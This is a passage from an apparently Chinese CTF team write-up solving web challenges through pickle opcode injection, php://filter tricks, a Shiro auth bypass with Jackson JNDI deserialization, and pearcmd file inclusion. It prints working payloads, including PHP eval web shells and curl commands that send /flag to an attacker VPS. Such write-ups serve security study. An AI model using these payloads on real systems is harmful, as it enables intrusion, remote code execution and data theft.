href="https://github.com/eddieivan01/pker">https://github.com/eddieivan01/pker</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">notadmin = GLOBAL(<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;notadmin&#x27;</span>)</span><br><span class="line">notadmin[<span class="string">&quot;admin&quot;</span>]=<span class="string">&quot;yes&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211025232747111.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025232747111.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025232747111"></p><p>绕过 admin 限制后，通过 OPCODE调用后门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cconfig</span><br><span class="line">backdoor</span><br><span class="line">(S<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;curl http://&#123;VPS_IP&#125;/`cat /flag|base64`&quot;)&#x27;</span></span><br><span class="line">tR</span><br></pre></td></tr></table></figure><p>相应指令解释，其中 <strong>.</strong> 表示结束</p><ul><li><p>c：把一个全局对象压入栈</p></li><li><p>(：向栈中压入一个MARK标记</p></li><li><p>S：实例化一个字符串对象</p></li><li><p>t：寻找栈中的第一个MARK，并组合其至栈顶的数据为元组</p></li><li><p>R：选择离栈顶的最近的第一个对象作为参数（必须为元组）、第二个对象作为函数，然后调用该函数</p></li></ul><p>POC</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> notadmin</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;&#x27;%s.%s&#x27; not allowed&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restricted_loads</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;cconfig\nnotadmin\np0\n0g0\nS&#x27;admin&#x27;\nS&#x27;yes&#x27;\nscconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">(S&#x27;__import__(&quot;os&quot;).system(&quot;curl http://&#123;VPS_IP&#125;/`cat /flag|base64`&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&quot;&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(payload))</span><br><span class="line">restricted_loads(payload)</span><br></pre></td></tr></table></figure><p>把输出的base64字符串拼接到目标机器GET请求name字段即可，因为无回显，所以外带</p><p><img src="/img/2021nitai/image-20211025232850237.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025232850237.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025232850237"></p><h3 id="0x3-EasyFilter"><a href="#0x3-EasyFilter" class="headerlink" title="0x3 EasyFilter"></a>0x3 EasyFilter</h3><p><a href="#">@Oah</a></p><p>题目源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;./&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;w&#x27;</span>)&#123;</span><br><span class="line">        @mkdir(<span class="string">&quot;./files/&quot;</span>);</span><br><span class="line">        <span class="variable">$content </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="variable">$file </span>= bin2hex(random_bytes(<span class="number">5</span>));</span><br><span class="line">        file_put_contents(<span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>,base64_encode(<span class="variable">$content</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;./files/&quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>] == <span class="string">&#x27;r&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$r </span>= <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">        <span class="variable">$file </span>= <span class="string">&quot;./files/&quot;</span>.<span class="variable">$r</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="string">&quot;php://filter/resource=<span class="subst">$file</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>读文件可控的就只有 <code>php://filter/resource=$file</code> ，之前刷过相关的题目，印象中 <code>resource=</code> 后是不能加过滤器的，然后队友解出来了，问他他说：发现文件名被识别成过滤器了</p><p><img src="/img/2021nitai/image-20211025233120676.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025233120676.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025233120676"></p><p>这样就好办了，写入 base64 编码过的一句话，通过base64解码过滤器读就行</p><p>POC</p><p>写入</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.70.181.14:32766/?action=w&amp;c=%3C?php%20eval($_GET[%22cmd%22]);?%3E</span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211025233322775.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025233322775.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025233322775"></p><p>读取</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://124.70.181.14:32766/?action=r&amp;r=read=convert.base64-decode/../d7376a8618&amp;cmd=system(%27cat%20../../../flag%27);</span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211025233349066.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025233349066.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025233349066"></p><h3 id="0x4-Jack-Shiro"><a href="#0x4-Jack-Shiro" class="headerlink" title="0x4 Jack-Shiro"></a>0x4 Jack-Shiro</h3><p><a href="#">@Oah</a> <a href="https://tari.moe/">@tari</a></p><p>这题主要是队友解，一开始我都没想到原来我刷过，然后刷过，又刚好有公网服务器，又刚好服务器上有 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，就做个帮忙拿flag工具人，这里复盘一下，两个题目的差别，以及自己去做的话，思路会怎样吧，然后和队里大佬的差异。有兴趣可以到<a href="https://buuoj.cn/">buu</a>去复现2021红明谷JavaWeb</p><p>和2021红明谷 JavaWeb 基本一致，但不同的是，这里没有提示 <code>/login</code> 目录，红明谷是有的</p><p>不过题目名字有提示，是Shiro，队里大佬说Shiro的默认登陆路径就是这个，直接访问 /login 没啥反应，就返回一个 /json</p><p><img src="/img/2021nitai/image-20211025234054238.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025234054238.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025234054238"></p><p>二话不说，先随便 POST 点JSON数据上去。</p><p><img src="/img/2021nitai/image-20211025234853842.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025234853842.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025234853842"></p><p>POST /json 返回302跳转</p><p><img src="/img/2021nitai/image-20211025234949480.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025234949480.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025234949480"></p><p>记起shiro有个未授权漏洞，有几种绕过姿势，最终锁定<a href="https://www.cnblogs.com/backlion/p/14055275.html">CVE-2020-11989</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /;/json</span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211025235213032.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025235213032.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025235213032"></p><p>在结合题目名字，Jack -&gt; Jackson，这里和红明谷也不一样，原题报错是下图这样的，即  <code>xxx.jackson.databind.xxx</code> </p><p><img src="/img/2021nitai/image-20211025235321065.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025235321065.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025235321065"></p><p>然后就很容易联想到去网上搜 jackjson databind 漏洞</p><p><img src="/img/2021nitai/image-20211025235507008.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025235507008.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025235507008"></p><p>除去一些漏洞通告，第一个漏洞分析就是了</p><p><a href="https://www.anquanke.com/post/id/227943">https://www.anquanke.com/post/id/227943</a></p><p>文中最后完整的 payload 是</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">&quot;[\&quot;com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource\&quot;,&#123;\&quot;jndiLocation\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;&#125;]&quot;</span>;</span><br></pre></td></tr></table></figure><p>根据这个 payload 试试反序列化</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource&quot;</span>,&#123;<span class="attr">&quot;jndiLocation&quot;</span>:<span class="string">&quot;ldap://vps:2233/a&quot;</span>&#125;]</span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211025235652753.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025235652753.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025235652753"></p><p>报错，提示这个 <code>com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource</code> 类找不到</p><p>尝试依次删除类前缀，下面这个就可以</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&quot;ch.qos.logback.core.db.JNDIConnectionSource&quot;</span>,&#123;<span class="attr">&quot;jndiLocation&quot;</span>:<span class="string">&quot;ldap://vps:2233/a&quot;</span>&#125;]</span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211025235820066.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025235820066.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025235820066"></p><p>可以成功返回数据，那应该是这种利用方式了，但为啥要删除类前缀就不是很清楚，估计题目中把这个包名给换了。</p><blockquote><p>队里大佬说各种找payload，随便找一个就能用了，不像我复现红明谷的时候还有个小坑</p></blockquote><p>然后上 JNDI 利用工具 （</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><p>关于原理，除了可以参考刚刚安全客的文章，还可以看这篇</p><p><a href="http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/">http://www.yulegeyu.com/2018/12/04/JNDI-Injection-Via-LDAP-Deserialize/</a></p><p>即利⽤LDAP Server返回序列化数据触发反序列化。</p><p>这里因服务端 jdk 版本过⾼，⽆法加载远程class，所以用 LDAP </p><p>在公网服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211026000646717.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026000646717.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026000646717"></p><p>注意，题目描述是有个压缩包，里面放着 <code>pom.xml</code> 的，里面有些是用Spring开发和版本之类的，然后红明谷就没有，只有未授权访问成功在网页的icon上有一片绿色的叶子，提示这是 Spring… 像下图这样</p><p><img src="/img/2021nitai/image-20211025234020628.png" class="lazyload" data-srcset="/img/2021nitai/image-20211025234020628.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211025234020628"></p><p>所以我们运行 JNDI，一定要选JDK（写着 SpringBoot 1.2.x+）的，就可以了</p><p>然后发现不知为啥Shell反弹不回来，不过没事，既然我们服务端能接收请求，那服务肯定是出网的，尝试通过 <code>curl</code> 外带</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="string">&#x27;curl http://vps_ip:2233 -F file=@/flag&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211026001138058.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026001138058.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026001138058"></p><p>从结果而言就题目考点就 Shiro + Jackson 反序列化，但一条龙下来，还是容易踩坑的，2333</p><h3 id="0x5-new-hospital"><a href="#0x5-new-hospital" class="headerlink" title="0x5 new_hospital"></a>0x5 new_hospital</h3><p><a href="https://tari.moe/">@tari</a></p><p>对于完全黑盒的题目，第一步肯定是信息收集，先目录爆破，爆破出来的很多，但实际有用的就3个（从做出来的结果而言，一开始分析的还挺头疼的）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://123.60.75.243:32766/old/       </span><br><span class="line">http://123.60.75.243:32766/flag.php     </span><br><span class="line">http://123.60.75.243:32766/feature.php</span><br></pre></td></tr></table></figure><p>访问 /flag.php 返回 <code>hacker?</code><br>在 feature.php 发现个文件读取，不过被拼接 .js 文件后缀</p><p><img src="/img/2021nitai/image-20211026001449562.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026001449562.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026001449562"></p><p>尝试远程读取进来，可以通过URL特性截断 .js ，但写入为JS代码了，无法解析为PHP代码<br><a href="http://123.60.75.243:32766/feature.php?&amp;id=http://VPS_IP/in.php?%2500">http://123.60.75.243:32766/feature.php?&amp;id=http://VPS_IP/in.php%3F%2500</a></p><p><img src="/img/2021nitai/IMG_0381.JPG" class="lazyload" data-srcset="/img/2021nitai/IMG_0381.JPG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="IMG_0381"></p><p><img src="/img/2021nitai/IMG_0382.JPG" class="lazyload" data-srcset="/img/2021nitai/IMG_0382.JPG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="IMG_0382"></p><p>仔细看，发现通过这个文件读取接口会返回一个Cookie</p><p><img src="/img/2021nitai/image-20211026001921694.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026001921694.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026001921694"></p><p>解码发现是刚刚提交的目录，注意文件后缀已经拼接了 .js（待会用到）</p><p><img src="/img/2021nitai/image-20211026001947710.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026001947710.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026001947710"></p><p>后面翻目录爆破出来的，访问 /old/feature.php</p><p><img src="/img/2021nitai/image-20211026002030304.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002030304.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002030304"></p><p>发现竟然和我刚刚访问在 /feature.php 提交的一样，开始寻思这是缓存？</p><p>是不是 file_get_content + file_put_content 呢？尝试 php filter 过滤器差异化写入无果，突然想到刚刚的Cookie，难道/old是通过Cookie里的目录设置的文件包含的内容？这样刚好可以直接无视 .js 后缀，然后结合目录爆破出来的 flag.php 是不是就能读到什么…</p><p>验证一下</p><p><img src="/img/2021nitai/image-20211026002138140.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002138140.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002138140"></p><h3 id="0x6-Give-me-your-0day"><a href="#0x6-Give-me-your-0day" class="headerlink" title="0x6 Give_me_your_0day"></a>0x6 Give_me_your_0day</h3><p><a href="#">@Oah</a></p><p>install.php 608 行有个文件包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/install.php?config&amp;dbAdapter=[路径]</span><br></pre></td></tr></table></figure><p>查到可以用 /usr/local/lib/php/pearcmd.php 利用</p><p>很多目录都没有写权限，但是发现/tmp目录可以写</p><p>写木马</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/install.php?config&amp;+-c+/tmp/a.php+-d+man_dir=&lt;?eval($_GET[&quot;cmd&quot;]);?&gt;/*+-s+list&amp;dbAdapter=../../../../usr/local/lib/php/pearcmd&amp;&amp;XDEBUG_SESSION_START=PHPSTORM</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>121.36.229.59:32767</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://121.36.229.59:32767/install.php?config</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>__typecho_lang=zh_CN</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p><img src="/img/2021nitai/image-20211026002600523.png" class="lazyload" data-srcset="/img/2021nitai/image-20211026002600523.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211026002600523"></p><p>读flag</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/install.php?config&amp;dbAdapter=../../../../tmp/a&amp;cmd=system(&#x27;cat+/flag&#x27;);</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>121.36.229.59:32767</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span 